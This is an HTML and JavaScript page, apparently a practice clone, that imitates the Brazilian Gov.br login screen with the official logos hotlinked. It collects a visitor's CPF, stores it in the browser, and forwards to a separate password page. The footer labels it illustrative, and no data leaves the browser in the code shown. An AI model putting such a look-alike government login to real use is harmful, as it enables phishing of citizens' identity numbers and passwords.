<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Gov.br</title>

    <link rel="stylesheet" href="CSS/gov.css"/>
    <link rel="icon" type="image/png" sizes="48x48" href="./Imagem/icon.gov.png">
</head>

<body>

    <!-- Cabeçalho -->
    <header>
        <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Logo Gov.br">
    </header>

    <!-- Conteúdo -->
    <div class="container">

        <!-- Imagem -->
        <div class="imagem">
            <img src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Imagem Gov.br">
        </div>

        <!-- Login -->
        <div class="card">

            <h2>Identifique-se</h2>

            <p>Digite seu CPF para acessar ou criar sua conta gov.br</p>

            <form id="loginForm">

                <label for="cpf">CPF</label>

                <input
                    type="text"
                    id="cpf"
                    placeholder="Digite seu CPF"
                    maxlength="14"
                    inputmode="numeric"
                    required>

                <button type="submit">Continuar</button>

            </form>

        </div>

    </div>

    <!-- Rodapé -->
    <footer>
        &copy; 2026 Página ilustrativa - Sistema Gov.br
    </footer>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const form = document.getElementById("loginForm");
    const input = document.getElementById("cpf");

    // Carrega CPF salvo
    const cpfSalvo = localStorage.getItem("cpf_usuario");

    if (cpfSalvo) {
        let cpfFormatado = cpfSalvo
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        input.value = cpfFormatado;
    }

    // Máscara do CPF
    input.addEventListener("input", () => {

        let cpf = input.value.replace(/\D/g, "");

        // Limita a 11 números
        cpf = cpf.slice(0, 11);

        // Formata CPF
        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        input.value = cpf;
    });

    form.addEventListener("submit", (e) => {
        e.preventDefault();

        // Remove pontos e hífen
        const cpf = input.value.replace(/\D/g, "");

        // Validação
        if (cpf.length !== 11) {
            alert("O CPF deve conter exatamente 11 números.");
            input.focus();
            return;
        }

        // Salva somente números
        localStorage.setItem("cpf_usuario", cpf);

        window.location.href = "senha.html";
    });

});
</script>

</body>
</html>
